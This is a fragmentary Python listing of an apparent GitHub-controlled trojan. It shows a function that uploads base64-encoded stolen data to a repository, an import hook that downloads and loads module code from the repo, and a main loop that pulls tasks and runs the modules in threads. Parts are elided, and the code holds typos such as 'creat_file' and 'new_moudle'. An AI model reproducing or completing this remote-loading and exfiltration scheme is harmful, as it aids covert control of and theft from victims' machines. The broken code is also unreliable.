...
def moudleDataStore(data):
	gh, repo, branch = connectToGit()
	remote_path = "data/%s/%d.data" % (data_path, random.randint(1000,10000))
	repo.creat_file(remote_path, "Commit message from %s"%trojan_id, base64.b64encode(data))
	return
...
class GitImporter(object):
	...
	def find_module(self, fullname, path = None):
		if configured:
			...
			content = getFileContent("module/%s" % fullname)
			if content is not None:
				self.current_module_code = base64.b64decode(content)
				return self
	def load_module(self, name):
		module = imp.new_moudle(name)
...
def main():
	...
	while True:
		if task_queue.empty():
			tasks = getConfigJson()
			for task in tasks:
				t = threading.Thread(target = module_runner, args = (task[moudle],))
				t.start()
